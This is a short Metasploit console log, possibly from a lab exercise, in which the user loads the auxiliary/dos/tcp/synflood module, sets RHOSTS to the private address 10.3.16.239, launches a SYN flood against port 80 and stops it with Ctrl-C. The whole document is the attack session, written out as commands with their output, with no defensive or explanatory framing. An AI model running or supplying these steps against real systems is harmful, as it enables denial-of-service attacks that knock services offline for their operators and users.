Metasploit tip: Open an interactive Ruby terminal with 
irb
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > show options


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/tcp/synflood) > set RHOSTS 10.3.16.239
RHOSTS => 10.3.16.239
msf6 auxiliary(dos/tcp/synflood) > show options



View the full module info with the info, or info -d command.

msf6 auxiliary(dos/tcp/synflood) > run
[*] Running module against 10.3.16.239

[*] SYN flooding 10.3.16.239:80...
^C[-] Stopping running against current target...
[*] Control-C again to force quit all targets.
[*] Auxiliary module execution completed
